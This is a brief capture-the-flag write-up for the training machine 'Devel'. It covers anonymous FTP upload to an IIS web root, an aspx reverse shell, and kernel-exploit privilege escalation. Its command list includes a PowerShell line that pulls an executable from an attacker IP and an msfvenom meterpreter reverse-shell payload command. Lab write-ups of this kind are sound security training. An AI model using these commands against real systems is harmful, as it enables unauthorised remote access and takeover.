# Devel - Writeup

### Ports found 80 (http), 21 (ftp)

This box had a big vulnerability and that was an anonymous login to the ftp coupled with the fact that the ftp root was the same as the web root. 

When logged in to ftp you can find a asp_client directory. By searching why this directory exists you can conclude that the server serves .apsx files. This ftp server also allows anonymous uploads. You can test if a upload is browsale by uploading a txt file and then browsing to it. When this is confirmed you are ready to upload a payload using msfvenom. By browsing the .aspx payload and listning on your attacker machine you can get a low priv shell.

Once connected with the low priv shell, you can run systeminfo and then grab the output and run windows_exploit_suggestor.py. It runs offline. You can also get Sherlock or Watson on the victim and run them as well. These are the low hanging fruit. 

In this case several vulnerabilities where found since no hotfixes were installed this was exploited using kernel exploits. At first the exploits did not work then I actually compiled them by myself and then it worked. 

### Notable Commands
- Downloading a file from lowpriv windows: powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.9:8000/Watson.exe','c:\Users\Public\TEST\Watson.exe')"
- Creating the payload for IIS 7.5 aspx msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=1337 -f aspx > totally_not_a_weird_file.aspx


### Lessons Learned
- If you are planning on using a kernel exploit make sure you compile it by yourself.
- Make sure you try Sherlock, Watson and local windows exploit suggestor (python).

>\>boom_root
